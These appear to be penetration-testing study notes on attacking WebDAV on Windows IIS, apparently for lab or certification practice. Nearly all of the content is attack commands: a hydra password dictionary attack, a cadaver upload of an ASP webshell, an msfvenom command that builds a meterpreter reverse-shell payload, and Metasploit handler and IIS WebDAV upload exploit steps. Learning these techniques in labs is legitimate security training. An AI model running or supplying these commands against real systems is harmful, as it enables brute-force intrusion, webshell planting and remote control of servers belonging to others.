
# Overview
- Set of extensions to HTTP on Win IIS
- Need to provide credentials user/pass
- can access by specifying folder
- can brute force or use prior obtained credentials
- --script http-enum : check for webdav folder and auth

# #Tools

## davtest
- used to scan, authenticate, and exploit WebDAV
- `davtest -auth bob:password -url http://10.34.2.3/webdav`
- series of checks on file types and execution capabilities
## cadaver
- file manipulation: up, down, edit
- `cadaver http://192.168.3.2/webdav`
- authenticate
- give shell where you can list and get/put
- `ls /usr/share/webshells/`
- `put /usr/share/webshells/asp/webshell.asp`
- then navigate in browser to webdav/webshell.asp
## #hydra
- dictionary attack
```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt IPaddr http-get /webdav/
```

## #msfvenom
create payload reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.32.2 LPORT=3001 -f asp > meterpreter.asp
```

## #metasploit
make sure postgresql is started
- **use multi/handler**
- set payload windows/meterpreter/reverse_tcp
	- Set to same payload as you generated in **msfvenom**
- set LHOST same_as_payload
- set LPORT same_as_ayload
- run
	- sysinfo
	- getuid
- `search iis upload`
- **use exploit/windows/iis/iis_webdav_upload_asp**
	- set HttpUsername bob
	- set HttpPassword password
	- set rhosts targetIP
	- set PATH /webdav/meterpreter.asp
	- run

